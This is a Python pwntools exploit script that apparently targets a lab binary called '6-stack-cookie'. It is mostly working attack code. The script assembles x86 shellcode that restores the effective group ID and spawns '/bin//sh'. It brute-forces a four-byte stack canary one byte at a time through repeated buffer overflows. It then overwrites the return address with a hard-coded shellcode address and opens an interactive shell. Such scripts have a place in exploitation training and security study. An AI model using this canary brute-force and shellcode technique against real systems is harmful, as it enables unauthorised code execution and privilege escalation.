#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, log, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

shellcode = asm(
    """
xor     eax, eax
add     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
xor     eax, eax
add     eax, 0x47
int     0x80
xor     eax, eax
add     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
xor     ecx, ecx
xor     edx, edx
int     0x80
"""
)

# p = gdb.debug(["./6-stack-cookie"], env={"SHELLCODE": shellcode})
p = process(["./6-stack-cookie"], env={"SHELLCODE": shellcode})
canary = []
guess = 0
while len(canary) < 4:
    print("TRIALS", p.recvline())  # reaming trials
    print("HOW", p.recvline())  # how many bytes?
    p.sendline(f"{128 + len(canary) + 1}".encode())
    print("READING", p.recvline())  # reading
    payload = b"A" * 128 + bytes(canary + [guess])
    p.sendline(payload)
    print("HELLO", p.recvline())  # hello
    # if guess == 10:
    #     print("NEWLINE", p.recvline())
    resp = p.recvline()  # stack smashing or exit
    print("STACK|EXIT", resp)
    if "stack" in resp.decode():
        guess += 1
        resp = p.recvline()  # exit status
        print("EXIT", resp)
    if "0" in resp.decode():
        print("Found byte: " + hex(guess))
        canary.append(guess)
        guess = 0
    print("GUESS", guess, canary)

print("========================================")
print("You've got", bytes(canary))
system_addr = p32(0xF7E3ADB0)
shellcode_addr = p32(0xFFFFDFBC)
print(system_addr, len(system_addr))
p.recvline()
p.recvline()
payload = b"A" * 128 + bytes(canary) + b"A" * (144 - 128 - len(canary)) + shellcode_addr
p.sendline(f"{len(payload)}".encode())
p.sendline(payload)
p.interactive()
